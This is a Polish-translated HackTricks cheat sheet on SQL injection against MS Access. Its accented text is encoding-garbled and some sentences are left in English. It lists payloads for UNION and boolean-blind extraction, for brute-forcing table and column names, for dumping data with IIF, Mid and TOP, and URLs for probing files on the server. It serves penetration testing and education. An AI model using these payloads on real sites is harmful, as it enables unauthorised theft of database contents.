# MS Access SQL Injection

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}

## Online Playground

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## Ograniczenia DB

### Konkatenacja ciÄ…gÃ³w

Konkatenacja ciÄ…gÃ³w jest moÅ¼liwa za pomocÄ… znakÃ³w `& (%26)` i `+ (%2b)`.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Komentarze

Nie ma komentarzy w MS Access, ale najwyraÅºniej moÅ¼liwe jest usuniÄ™cie ostatniego elementu zapytania za pomocÄ… znaku NULL:
```sql
1' union select 1,2 from table%00
```
JeÅ›li to nie dziaÅ‚a, zawsze moÅ¼esz poprawiÄ‡ skÅ‚adniÄ™ zapytania:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Stacked Queries

Nie sÄ… obsÅ‚ugiwane.

### LIMIT

Operator **`LIMIT`** **nie jest zaimplementowany**. MoÅ¼liwe jest jednak ograniczenie wynikÃ³w zapytania SELECT do **pierwszych N wierszy tabeli za pomocÄ… operatora `TOP`**. `TOP` przyjmuje jako argument liczbÄ™ caÅ‚kowitÄ…, reprezentujÄ…cÄ… liczbÄ™ wierszy do zwrÃ³cenia.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Just like TOP you can use **`LAST`** which will get the **wiersze z koÅ„ca**.

## UNION Queries/Sub queries

In a SQLi you usually will want to somehow execute a new query to extract information from other tables. MS Access always requires that in **podzapytaniach lub dodatkowych zapytaniach wskazany jest `FROM`**.\
So, if you want to execute a `UNION SELECT` or `UNION ALL SELECT` or a `SELECT` between parenthesis in a condition, you always **musisz wskazaÄ‡ `FROM` z waÅ¼nÄ… nazwÄ… tabeli**.\
Therefore, you need to know a **waÅ¼nÄ… nazwÄ™ tabeli**.
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

{% hint style="warning" %}
To pozwoli Ci na wyeksfiltrowanie wartoÅ›ci z bieÅ¼Ä…cej tabeli bez potrzeby znajomoÅ›ci jej nazwy.
{% endhint %}

**MS Access** pozwala na **dziwnÄ… skÅ‚adniÄ™** takÄ… jak **`'1'=2='3'='asd'=false`**. Jak zwykle, SQL injection bÄ™dzie w klauzuli **`WHERE`**, co moÅ¼emy wykorzystaÄ‡.

WyobraÅº sobie, Å¼e masz SQLi w bazie danych MS Access i wiesz (lub zgadÅ‚eÅ›), Å¼e jedna **nazwa kolumny to username**, a to jest pole, ktÃ³re chcesz **wyeksfiltrowaÄ‡**. MoÅ¼esz sprawdziÄ‡ rÃ³Å¼ne odpowiedzi aplikacji webowej, gdy uÅ¼ywana jest technika chaining equals i potencjalnie wyeksfiltrowaÄ‡ zawartoÅ›Ä‡ za pomocÄ… **boolean injection** uÅ¼ywajÄ…c funkcji **`Mid`** do uzyskania podciÄ…gÃ³w.
```sql
'=(Mid(username,1,3)='adm')='
```
JeÅ›li znasz **nazwÄ™ tabeli** i **kolumny**, ktÃ³re chcesz zrzuciÄ‡, moÅ¼esz uÅ¼yÄ‡ kombinacji `Mid`, `LAST` i `TOP`, aby **wyciekÅ‚o wszystkie informacje** za pomocÄ… boolean SQLi:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### Brute-forcing Tables names

UÅ¼ywajÄ…c techniki Å‚aÅ„cuchowego rÃ³wnoÅ›ci, moÅ¼esz rÃ³wnieÅ¼ **bruteforce'owaÄ‡ nazwy tabel** za pomocÄ… czegoÅ› takiego:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ bardziej tradycyjnego sposobu:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Feel free to check this in the online playground._

* Nazwy wspÃ³lnych tabel Sqlmap: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* Istnieje inna lista w [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Brute-Forcing Nazwy kolumn

MoÅ¼esz **brute-forcowaÄ‡ aktualne nazwy kolumn** za pomocÄ… sztuczki z Å‚aÅ„cuchowymi rÃ³wnaniami:
```sql
'=column_name='
```
Lub z **group by**:
```sql
-1' GROUP BY column_name%00
```
Lub moÅ¼esz przeprowadziÄ‡ atak brute-force na nazwy kolumn **innej tabeli** za pomocÄ…:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Dumping data

JuÅ¼ omÃ³wiliÅ›my [**technikÄ™ Å‚Ä…czenia rÃ³wnaÅ„**](ms-access-sql-injection.md#chaining-equals-+-substring) **w celu zrzutu danych z bieÅ¼Ä…cej i innych tabel**. Ale sÄ… teÅ¼ inne sposoby:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
W skrÃ³cie, zapytanie uÅ¼ywa instrukcji â€if-thenâ€, aby wywoÅ‚aÄ‡ â€200 OKâ€ w przypadku sukcesu lub â€500 Internal Errorâ€ w przeciwnym razie. WykorzystujÄ…c operator TOP 10, moÅ¼liwe jest wybranie pierwszych dziesiÄ™ciu wynikÃ³w. NastÄ™pne uÅ¼ycie LAST pozwala uwzglÄ™dniÄ‡ tylko 10-tÄ… krotkÄ™. Na takiej wartoÅ›ci, uÅ¼ywajÄ…c operatora MID, moÅ¼na przeprowadziÄ‡ prostÄ… porÃ³wnanie znakÃ³w. Odpowiednio zmieniajÄ…c indeksy MID i TOP, moÅ¼emy zrzuciÄ‡ zawartoÅ›Ä‡ pola â€usernameâ€ dla wszystkich wierszy.

### Czasowe

SprawdÅº [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### Inne interesujÄ…ce funkcje

* `Mid('admin',1,1)` pobiera podciÄ…g z pozycji 1 o dÅ‚ugoÅ›ci 1 (pozycja poczÄ…tkowa to 1)
* `LEN('1234')` pobiera dÅ‚ugoÅ›Ä‡ ciÄ…gu
* `ASC('A')` pobiera wartoÅ›Ä‡ ascii znaku
* `CHR(65)` pobiera ciÄ…g z wartoÅ›ci ascii
* `IIF(1=1,'a','b')` jeÅ›li to wtedy
* `COUNT(*)` zlicza liczbÄ™ elementÃ³w

## Enumerowanie tabel

Z [**tutaj**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) moÅ¼esz zobaczyÄ‡ zapytanie do uzyskania nazw tabel:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
Jednak naleÅ¼y zauwaÅ¼yÄ‡, Å¼e bardzo typowe jest znalezienie SQL Injection, gdzie **nie masz dostÄ™pu do odczytu tabeli `MSysObjects`**.

## DostÄ™p do systemu plikÃ³w

### PeÅ‚na Å›cieÅ¼ka katalogu gÅ‚Ã³wnego witryny

ZnajomoÅ›Ä‡ **absolutnej Å›cieÅ¼ki katalogu gÅ‚Ã³wnego witryny moÅ¼e uÅ‚atwiÄ‡ dalsze ataki**. JeÅ›li bÅ‚Ä™dy aplikacji nie sÄ… caÅ‚kowicie ukryte, Å›cieÅ¼ka katalogu moÅ¼e zostaÄ‡ ujawniona, prÃ³bujÄ…c wybraÄ‡ dane z nieistniejÄ…cej bazy danych.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access odpowiada **komunikatem o bÅ‚Ä™dzie zawierajÄ…cym peÅ‚nÄ… Å›cieÅ¼kÄ™ katalogu witryny**.

### Enumeracja plikÃ³w

NastÄ™pujÄ…cy wektor ataku moÅ¼e byÄ‡ uÅ¼yty do **wnioskowania o istnieniu pliku w zdalnym systemie plikÃ³w**. JeÅ›li okreÅ›lony plik istnieje, MS Access wywoÅ‚uje komunikat o bÅ‚Ä™dzie informujÄ…cy, Å¼e format bazy danych jest nieprawidÅ‚owy:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Inny sposÃ³b enumeracji plikÃ³w polega na **okreÅ›leniu elementu bazy danych.tabela**. **JeÅ›li** okreÅ›lony **plik istnieje**, MS Access wyÅ›wietla **komunikat o bÅ‚Ä™dzie formatu bazy danych**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### Zgadywanie nazwy pliku .mdb

**NazwÄ™ pliku bazy danych (.mdb)** moÅ¼na wnioskowaÄ‡ za pomocÄ… nastÄ™pujÄ…cego zapytania:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Gdzie **name\[i] to nazwa pliku .mdb** i **realTable to istniejÄ…ca tabela** w bazie danych. ChociaÅ¼ MS Access zawsze wywoÅ‚a komunikat o bÅ‚Ä™dzie, moÅ¼liwe jest odrÃ³Å¼nienie nieprawidÅ‚owej nazwy pliku od prawidÅ‚owej nazwy pliku .mdb.

### Åamacza haseÅ‚ .mdb

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) to darmowe narzÄ™dzie, ktÃ³re moÅ¼na wykorzystaÄ‡ do odzyskania gÅ‚Ã³wnego hasÅ‚a bazy danych Microsoft Access 95/97/2000/XP lub Jet Database Engine 3.0/4.0.

## Odniesienia

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
